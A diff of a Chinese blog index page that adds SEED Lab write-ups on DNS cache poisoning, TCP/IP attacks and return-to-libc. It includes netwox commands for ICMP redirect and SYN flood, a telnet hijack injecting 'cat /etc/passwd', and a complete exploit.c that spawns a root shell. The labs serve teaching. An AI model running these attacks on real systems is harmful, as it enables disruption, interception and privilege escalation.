printf(&quot;packet send error %d which means %s\n&quot;,errno,strerror(errno));</div><div class="line">	sleep(0.9);</div><div class="line">	response(data, argv[2], argv[1]);</div><div class="line">	&#125;</div><div class="line">close(sd);</div><div class="line"></div><div class="line">return 0;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在Attacker机器中构造查询信息，随机生成xxxx.example.com的域名，其中xxxx是随机生成的，该目的就是生成不存在的域名，然后while循环，向域名服务器发送查询xxxx.example.com域名的请求，紧接着发送伪造的回复的包。</p>
+<p>sudo rndc dumpdb -cache之后查看/etc/bind/dump.db文件的结果如下：<br><img src="http://i.imgur.com/wuWQlbB.png" alt=""></p>
+<h3 id="实验二：结果的确认"><a href="#实验二：结果的确认" class="headerlink" title="实验二：结果的确认"></a>实验二：结果的确认</h3><p>使用假域名</p>
+<ul>
+<li><p>配置攻击者机器为dns服务器，配置过程和上一个dns服务器过程一致。</p>
+</li>
+<li><p>在Apollo服务器上配置ns.dnslabattacker.net的解析。</p>
+</li>
+</ul>
+<p>具体配置如下：<br>首先在/etc/bind/name.conf.default-zones中配置zone信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">zone “ns.dnslabattacker.net”</div><div class="line">&#123;	type master:</div><div class="line">	file “/etc/bind/db.attacker”;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p>表明具体的解析文件在/etc/bind/db.attacker中，该文件具体内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">;</div><div class="line">; BIND data file for local loopback interface</div><div class="line">;</div><div class="line">$TTL	604800</div><div class="line">@	IN	SOA	localhost. root.localhost. (</div><div class="line">			      2		; Serial</div><div class="line">			 604800		; Refresh</div><div class="line">			  86400		; Retry</div><div class="line">			2419200		; Expire</div><div class="line">			 604800 )	; Negative Cache TTL</div><div class="line">;</div><div class="line">@	IN	NS	ns.dnslabattacker.net.</div><div class="line">@	IN	A	192.168.86.138</div><div class="line">@	IN	AAAA	::1</div></pre></td></tr></table></figure>
+<p>其中192.168.86.138为攻击者机器的地址。<br>给db.attacker文件加权限chmod 644 db.attacker</p>
+<ul>
+<li>在攻击者机器上配置example.com域名的解析，首先在/etc/bind/name/conf中添加如下信息：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">zone “example.com” &#123;</div><div class="line">	type master;</div><div class="line">	file “/etc/bind/example.com.db”;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p>然后再创建/etc/bind/example.com.db文件，内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$TTL 3D</div><div class="line">@	IN	SOA	ns.example.com. admin.example.com. (</div><div class="line">		2008111001</div><div class="line">		8H</div><div class="line">		2H</div><div class="line">		4W</div><div class="line">		1D)</div><div class="line"></div><div class="line">@	IN	NS	ns.dnslabattacker.net.</div><div class="line">@	IN	MX	10 mail.example.com.</div><div class="line"></div><div class="line">www	IN	A	1.2.3.4</div><div class="line">mail	IN	A	1.2.3.2</div><div class="line">*.example.com.	IN	A 1.2.3.100</div></pre></td></tr></table></figure>
+<p>给example.com.db文件加权限，chmod 644 example.com.db。</p>
+<ul>
+<li>在victim机器中dig www.example.com,结果如下，解析了exmaple.com的ip地址为1.2.3.4，域名服务器为ns.dnslabattacker.net<br><img src="http://i.imgur.com/oaXRo4v.png" alt=""></li>
+</ul>
+<p>在victim中ping www.example.com，结果如下：<br><img src="http://i.imgur.com/bUr9h9m.png" alt=""><br>其访问的是1.2.3.4的ip地址。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/05/16/tcp-ip-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="binpang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PCB博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/05/16/tcp-ip-attack/" itemprop="url">SeedLab:TCP/IP Attack</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-16T18:13:39+08:00">
+                2017-05-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络/" itemprop="url" rel="index">
+                    <span itemprop="name">网络</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><p>该实验环境是在同一个局域网下完成的，完成整个的实验需要三台机器，这三台机器的ip和mac地址如下所示：</p>
+<p>机器1： 192.168.47.174   mac: 00:0c:29:08:4f:9c</p>
+<p>机器2： 192.168.47.175   mac: 00:0c:29:4c:5e:ff</p>
+<p>机器3： 192.168.47.176   mac: 00:0c:29:1c:41:17</p>
+<p>这三台机器的默认网关：192.168.47.2</p>
+<p>操作系统：ubuntu 12.04  32位</p>
+<p>所使用的工具：netwox, hunt, wireshark</p>
+<h2 id="实验操作："><a href="#实验操作：" class="headerlink" title="实验操作："></a>实验操作：</h2><h3 id="实验1：ARP缓存中毒"><a href="#实验1：ARP缓存中毒" class="headerlink" title="实验1：ARP缓存中毒"></a>实验1：ARP缓存中毒</h3><p>ARP协议的主要目的在于简化OSI模型第二层和第三层间地址的翻译。第二层(也就是数据链层)使用MAC地址，以便硬件设备可以在小范围内直接进行通信。第三层(也就是网络层)使用IP地址(最常见的形式)来创建连通世界各地用户的大规模网络。数据链层直接处理连接在一起的设备，而网络层处理那些直接以及间接连接的设备，每一层都有自己的地址形式，他们必须合作才能实现网络通信。正是由于这个原因，ARP与RFC826(以太网地址解析协议)一起被创建。<br>在该实验中，首先有一个机器1在局域网中发送arp包，包的内容为将自己的mac地址与机器2的ip地址相关联，此时，如果机器3想要发送一个包给机器2，就会发不过去。具体操作如下：<br>在机器1中执行如下指令，即向局域网广播00:0c:29:08:4f:9c的mac地址对应的ip地址为192.168.47.175</p>
+<p><img src="http://i.imgur.com/wFgP5KG.png" alt=""></p>
+<p>打开wireshark后可以看到机器1就发送arp的包意思为192.168.47.175在mac地址为00:0c:29:08:4f:9c。</p>
+<p><img src="http://i.imgur.com/dJLu8Fi.png" alt=""></p>
+<p>所以在机器3 输入arp -a，结果如下：</p>
+<p><img src="http://i.imgur.com/9xIEF0B.png" alt=""></p>
+<p>即ip地址192.168.47.175对应了机器1的mac地址00:0c:29:08:4f:9c<br>在机器3中输入telnet之后结果如下：</p>
+<p><img src="http://i.imgur.com/ZQrhZDT.png" alt=""></p>
+<h3 id="实验2：ICMP重定向攻击"><a href="#实验2：ICMP重定向攻击" class="headerlink" title="实验2：ICMP重定向攻击"></a>实验2：ICMP重定向攻击</h3><p>  ICMP重定向的攻击是一个比较有效的并且类似于ARP攻击的手段,而且是利用了另外一个正常的协议——ICMP协议，发起的攻击。黑客远程控制目标机器是有些难度的，但如果只是冒充网关，那就非常容易实现了，黑客冒充网关，对目标主机发送ICMP重定向报文，报文里的路由IP填成一个虚假的、不存在或网络不通的地址，这样，目标主机收到ICMP重定向报文后，就会对路由表进行添加、修改（前提是ICMP重定向功能是开启的），将黑客指定的目标与目标间通信的网关地址设置成那个虚假的IP地址，这样，就实现了利用ICMP重定向的攻击。</p>
+<p>攻击者：机器1</p>
+<p>受害者：机器2</p>
+<p>在机器1上运行sudo traceroute 119.75.218.70(百度的ip)</p>
+<p><img src="http://i.imgur.com/u6OHT4R.png" alt=""></p>
+<p>可知第一个route为192.168.47.2即默认网关的地址。</p>
+<p>Wireshark抓包如图所示：</p>
+<p><img src="http://i.imgur.com/pd3O6dP.png" alt=""></p>
+<p>现在机器1以默认网关的名义向机器3发送IMCP重定位信息，通知机器3，默认路由的地址已经改为Machine 1（192.168.47.174）。<br>同时为了机器1能够转发数据包，需要对机器1进行转发数据包的设置，可用下面的命令实现：   </p>
+<pre><code>sysctl net.ipv4.ip_forward=1
+</code></pre><p>进行攻击的命令:</p>
+<pre><code>netwox 86 -d &quot;Eth0&quot; --gw &quot;192.168.47.174&quot; -i &quot;192.168.47.2&quot;
+</code></pre><p>结果如下图所示：</p>
+<p><img src="http://i.imgur.com/P29eZa2.png" alt=""></p>
+<p>则机器3在traceroute 百度的时候，会首先经过机器1</p>
+<p>用WireShark抓包的结果如下：</p>
+<p><img src="http://i.imgur.com/S30DhcI.png" alt=""></p>
+<h3 id="实验3：SYN-泛洪攻击"><a href="#实验3：SYN-泛洪攻击" class="headerlink" title="实验3：SYN 泛洪攻击"></a>实验3：SYN 泛洪攻击</h3><p>通常一次TCP连接建立需要三个步骤，第一客户端发送SYN包给服务端，第二服务器分配一定资源给这个连接并返回SYN/ACK包，然后等待连接就建立的最后的ACK包，第三最后客户端发送ACK报文。这样两者之间的连接就建立起来了，可以通过连接传输数据。攻击的过程就是疯狂 发送SYN报文，而不返回ACK报文。服务器占用过多资源，导致系统资源占用过多，没有能力响应别的操作或正常的网络请求。用自己很少的资源占用对方大量的资源，以小博大。</p>
+<p>将机器3作为telnet服务器，机器1通过telnet来登陆机器3：</p>
+<p><img src="http://i.imgur.com/x6Y658t.png" alt=""></p>
+<p>在机器3中输入sysctl -a | grep cookie输出如下图：</p>
+<p><img src="http://i.imgur.com/5N2e4Iu.png" alt=""></p>
+<p>可以知道该机器打开了syn cookie，现将其关闭：sysctl -w net.ipv4.tcp_syncookies=0<br>现在对Machine 3的端口23(telnet端口)进行洪泛攻击：</p>
+<pre><code>netwox 76 -i &quot;192.168.47.176&quot; -p &quot;23&quot;
+</code></pre><p>此时查看机器3的端口23的待处理队列如下：</p>
+<p><img src="http://i.imgur.com/ves3MaV.png" alt=""></p>
+<p>由上图可知tcp的23端口被泛洪攻击了。<br>机器2 telnet连接机器3，由下图可知连接不上。</p>
+<p><img src="http://i.imgur.com/1DJYECg.png" alt=""></p>
+<p>如果打开了syn cookie，则机器2可以telnet连接机器3，如图所示：</p>
+<p><img src="http://i.imgur.com/Nrf34yt.png" alt=""></p>
+<p>Syn cookie的原理就是如果短时间内连续收到某个IP的重复SYN请求，则认为受到了该IP的攻击，丢弃来自该IP的后续请求报文。此外合理地采用防火墙等外部网络安全设施也可缓解SYN泛洪攻击。</p>
+<h3 id="实验4：对Telnet的TCP-RST攻击"><a href="#实验4：对Telnet的TCP-RST攻击" class="headerlink" title="实验4：对Telnet的TCP RST攻击"></a>实验4：对Telnet的TCP RST攻击</h3><p>RST表示复位，用来异常的关闭连接，在TCP的设计中它是不可或缺的。发送RST包关闭连接时，不必等缓冲区的包都发出去（不像上面的FIN包），直接就丢弃缓存区的包发送RST包。而接收端收到RST包后，也不必发送ACK包来确认。<br>A和服务器B之间建立了TCP连接，此时C伪造了一个TCP包发给B，使B异常的断开了与A之间的TCP连接，就是RST攻击了。</p>
+<p>机器1连接上了机器3的telnet服务器，如图所示：</p>
+<p><img src="http://i.imgur.com/BAqpyeu.png" alt=""></p>
+<p>可知机器1已经telnet上了机器3。</p>
+<p>现在在机器2上构造一个 TCP TST包发送给机器3，这样Telnet 客户端就会断开连接：</p>
+<p><img src="http://i.imgur.com/b41fMit.png" alt=""></p>
+<p>再次连接也连接不上。</p>
+<h3 id="实验5：对视频流应用程序的TCP-RST攻击"><a href="#实验5：对视频流应用程序的TCP-RST攻击" class="headerlink" title="实验5：对视频流应用程序的TCP RST攻击"></a>实验5：对视频流应用程序的TCP RST攻击</h3><p>该实验与实验4的原理一致，所以直接展示一下实验结果。</p>
+<p>该实验有两个机器，victim的 ip为192.168.47.177<br>Attacker的ip为192.168.47.178</p>
+<p>首先victim机器在优酷上看视频：</p>
+<p><img src="http://i.imgur.com/KJGEMa8.png" alt=""></p>
+<p>然后在attacker的机器上发送RST包：</p>
+<p><img src="http://i.imgur.com/mxXaeMw.png" alt=""></p>
+<p>在victim机器上，</p>
+<p><img src="http://i.imgur.com/tia4LRQ.png" alt=""></p>
+<p>可以看出，加载失败，攻击成功。</p>
+<p>然后再attacker的机器上停止发送RST包，再刷新victim机器的视频，可以再次播放。</p>
+<p><img src="http://i.imgur.com/EhDvjUV.png" alt=""></p>
+<h3 id="实验6：TCP报文劫持"><a href="#实验6：TCP报文劫持" class="headerlink" title="实验6：TCP报文劫持"></a>实验6：TCP报文劫持</h3><p>机器 2 (192.168.47.175) Telnet到机器 3(192.168.47.176);<br>在机器 1(192.168.47.174)上劫持机器 2 到机器 3上的Telnet报文。</p>
+<p>在机器1上开启hunt工具来嗅探当前网络上的TCP连接</p>
+<p><img src="http://i.imgur.com/A1nvlIh.png" alt=""></p>
+<p>在机器2上通过telnet连接上机器3：</p>
+<p><img src="http://i.imgur.com/1cjGs3C.png" alt=""></p>
+<p>劫持TCP报文，在Machine 1上显示 Machine3上的passwd文件。</p>
+<p><img src="http://i.imgur.com/KO50UJE.png" alt=""></p>
+<p>选择第0行，然后在向劫持的Telnet报文中注入cat /etc/passwd命令，实现机器 3上的passwd文件。</p>
+<p><img src="http://i.imgur.com/zFc43Dt.png" alt=""></p>
+<p>结果在机器3上显示如下：</p>
+<p><img src="http://i.imgur.com/WyEfqx3.png" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/05/16/seed-returnToLibc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="binpang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PCB博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/05/16/seed-returnToLibc/" itemprop="url">seedLab:returnToLibc</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-16T17:01:27+08:00">
+                2017-05-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/反汇编/" itemprop="url" rel="index">
+                    <span itemprop="name">反汇编</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><h2 id="该教程是根据Seed-Lab-return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击-′▽-〃"><a href="#该教程是根据Seed-Lab-return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击-′▽-〃" class="headerlink" title="该教程是根据Seed Lab: return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击(′▽`〃)"></a>该教程是根据<a href="http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Return_to_libc/" target="_blank" rel="external">Seed Lab: return-to-libc</a>的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击(′▽`〃)</h2><h3 id="一：背景介绍"><a href="#一：背景介绍" class="headerlink" title="一：背景介绍"></a>一：背景介绍</h3><h4 id="DEP数据执行保护"><a href="#DEP数据执行保护" class="headerlink" title="DEP数据执行保护"></a>DEP数据执行保护</h4><p>  溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP（数据执行保护，Data Execution Prevention）就是用来弥补计算机对数据和代码混淆这一天然缺陷的。DEP的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP 的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。所以一般的将shellcode存放到栈中并将shellcode执行的方式在这种机制中是不可行的。</p>
+<p>  在Linux中，通常在编译的时候添加 -fno-stack-protector -z noexecstack 编译选项就会开启该模式，在该模式下，不能像以前的攻击将恶意代码overflow进栈中，并将return地址指向恶意代码开始处，在这种情况下应该借用系统库的调用从而达到提权等目的。</p>
+<h4 id="Return-to-libc原理"><a href="#Return-to-libc原理" class="headerlink" title="Return-to-libc原理"></a>Return-to-libc原理</h4><p>   Return-into-libc 攻击可以将漏洞函数返回到内存空间已有的动态库函数中。而为了理解 return-into-libc 攻击，这里首先给出程序函数调用过程中栈帧的结构。</p>
+<p>   图 1.函数调用时栈帧的结构：</p>
+<p>  <img src="http://i.imgur.com/HE3Xv98.png" alt=""></p>
+<p>   图 1 给出了一个典型的函数调用时的栈帧结构，该栈从高位地址向低位地址增长。每当一个函数调用另一个函数向低地址方向压栈，而当函数返回时向高地址方向清栈。例如，当 main() 调用 func(arg_1,arg_2,arg_3) 时，首先将所有参数arg_1,arg_2 和 arg_3入栈。图 1 中参数从右向左依次被压入栈中，这是因为 C 语言中函数传参是从右向左压栈的。然后，call 指令会将返回地址压栈，并使执行流转到 func()。返回地址是 call 指令的下一条指令的地址，这个用于告知 func ()函数返回后从 main()函数的哪条指令开始执行。进入 func 函数后，通常需要将 main()函数的栈底指针 ebp 保存到栈中并将当前的栈顶指针 esp 保存在 ebp 中作为 func 的栈底。接下来，func 函数会在栈中为局部变量等分配空间。因此，调用函数 func()时的栈帧结构如图 1 所示。<br>   而当 func()执行完成返回时 leave 指令将 ebp 拷贝到 esp 中清空局部变量在栈中的区域，然后从堆栈中弹出老 ebp 放回 ebp 寄存器使 ebp 恢复为 main()函数的栈底。然后 ret 指令从栈中获取返回地址，返回到 main()函数中继续执行。</p>
+<p>   攻击者可以利用栈中的内容实施 return-into-libc 攻击。这是因为攻击者能够通过缓冲区溢出改写返回地址为一个库函数的地址，并且将此库函数执行时的参数也重新写入栈中。这样当函数调用时获取的是攻击者设定好的参数值，并且结束后返回时就会返回到库函数而不是 main()。而此库函数实际上就帮助攻击者执行了其恶意行为。更复杂的攻击还可以通过 return-into-libc 的调用链（一系列库函数的连续调用）来完成。</p>
+<h3 id="二：实验部分"><a href="#二：实验部分" class="headerlink" title="二：实验部分"></a>二：实验部分</h3><h4 id="获得system-和exit-的地址"><a href="#获得system-和exit-的地址" class="headerlink" title="获得system()和exit()的地址"></a>获得system()和exit()的地址</h4><p>由于在实验开始就执行了 sysctl -w kernel.randomize_va_space=0 命令，该命令用来将系统的ASLR（地址随机化机制）关闭，所以在每次将libc.so库加载到内存中时，system()和exit()的地址都是一样的。所以就gdb调试retlib程序，在main出设置断点，并运行，程序会在main的入口处停下，然后执行p system,和p exit就能将system和exit在内存中的地址打印出来。</p>
+<p>具体操作如图2所示：</p>
+<p><img src="http://i.imgur.com/Rc0pUVy.png" alt=""></p>
+<p>由该图可知，函数system()和exit()的地址分别为0xb7e5f430和0xb7e52fb0。</p>
+<h4 id="获得”-bin-sh”字符串地址"><a href="#获得”-bin-sh”字符串地址" class="headerlink" title="获得”/bin/sh”字符串地址"></a>获得”/bin/sh”字符串地址</h4><p>获得字符串的地址主要有两种方法:其中第一个是在libc.so中找到字符串地址，第二个方法是将/bin/sh字符串放到环境变量中去</p>
+<ol>
+<li>由于libc.so的地址是固定的，所以在libc.so的”/bin/sh”字符串的地址也是固定的，所以可以在gdb调试的时候用find指定找到一个/bin/sh字符串的地址，具体方法如图3所示：<br><img src="http://i.imgur.com/qkflPn4.png" alt=""></li>
+<li>首先export MYSHELL = /bin/sh,然后编写程序获得名为MYSHELL环境变量的地址，将其输出即可，输出结果如图4所示：</li>
+</ol>
+<h4 id="获得buffer要return的地址偏移"><a href="#获得buffer要return的地址偏移" class="headerlink" title="获得buffer要return的地址偏移"></a>获得buffer要return的地址偏移</h4><p>首先构造一个从A-Z和从a-z的badfile文件，然后gdb retlib，run，就会出现栈溢出，找出栈溢出的地址为如图5所示</p>
+<p><img src="http://i.imgur.com/RHD2w3J.png" alt=""></p>
+<p>0x62615a59代表的char为baZY，因为它是大端法表示的，所以为YZab，在地buffer的24-27偏移处。所以X为24。</p>
+<p>由图1可知道栈的结构，即return地址的下面4个字节为要返回的下个地址指针，再下面4个字节为函数参数，所以24+4=28处存取exit()的函数，24+8=32出存取/bin/sh字符串的地址</p>
+<h4 id="编写exploit程序"><a href="#编写exploit程序" class="headerlink" title="编写exploit程序"></a>编写exploit程序</h4><p>所以exploit.c的程序如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  char buf[40];</div><div class="line">  FILE *badfile;</div><div class="line"></div><div class="line">  badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;);</div><div class="line">  int i;</div><div class="line">  for(i = 0;i &lt; 40;i++)</div><div class="line"> buf[i] = 0x90;</div><div class="line"></div><div class="line">  /* You need to decide the addresses and </div><div class="line"> the values for X, Y, Z. The order of the following </div><div class="line"> three statements does not imply the order of X, Y, Z.</div><div class="line"> Actually, we intentionally scrambled the order. */</div><div class="line">  *(long *) &amp;buf[32] = 0xb7f80fb8 ;   //  &quot;/bin/sh&quot;</div><div class="line">  *(long *) &amp;buf[24] = 0xb7e5f430 ;   //  system()</div><div class="line">  *(long *) &amp;buf[28] = 0xb7e52fb0 ;   //  exit()</div><div class="line"></div><div class="line">  fwrite(buf, sizeof(buf), 1, badfile);</div><div class="line">  fclose(badfile);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在前面步骤获得了system()，exit()和/bin/sh在内存的地址，以及return在buffer的偏移地址，所以可以按照上面获得的信息来补全exploit.c的程序。</p>
+<p>retlib.c程序:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">/* This program has a buffer overflow vulnerability. */</div><div class="line">/* Our task is to exploit this vulnerability */</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int bof(FILE *badfile)</div><div class="line">&#123;</div><div class="line">char buffer[12];</div><div class="line"></div><div class="line">/* The following statement has a buffer overflow problem */</div><div class="line">fread(buffer, sizeof(char), 40, badfile);</div><div class="line"></div><div class="line">return 1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">FILE *badfile;</div><div class="line"></div><div class="line">badfile = fopen(&quot;badfile&quot;, &quot;r&quot;);</div><div class="line">bof(badfile);</div><div class="line"></div><div class="line">printf(&quot;Returned Properly\n&quot;);</div><div class="line"></div><div class="line">fclose(badfile);</div><div class="line">return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在编译retlib.c程序时，用root权限编译，这样在运行/bin/sh程序时即可提权。</p>
+<p>提权结果如下：</p>
+<p><img src="http://i.imgur.com/CFdjcrV.png" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/05/16/open-Rebort/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -311,7 +1109,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/05/16/open-Rebort/" itemprop="url">open_Rebort</a></h1>
+                <a class="post-title-link" href="/2017/05/16/open-Rebort/" itemprop="url">openGL_Rebort</a></h1>
         
 
         <div class="post-meta">
@@ -791,7 +1589,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2016/05/16/seed-returnToLibc/">
+    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2016/08/16/xposed/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="binpang">
@@ -810,7 +1608,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2016/05/16/seed-returnToLibc/" itemprop="url">seed-returnToLibc</a></h1>
+                <a class="post-title-link" href="/2016/08/16/xposed/" itemprop="url">XposedHook:hook敏感函数</a></h1>
         
 
         <div class="post-meta">
@@ -822,8 +1620,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-16T17:01:27+08:00">
-                2016-05-16
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-08-16T17:58:59+08:00">
+                2016-08-16
               </time>
             
 
@@ -845,8 +1643,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/反汇编/" itemprop="url" rel="index">
-                    <span itemprop="name">反汇编</span>
+                  <a href="/categories/Hook/" itemprop="url" rel="index">
+                    <span itemprop="name">Hook</span>
                   </a>
                 </span>
 
@@ -881,34 +1679,261 @@
       
         
           
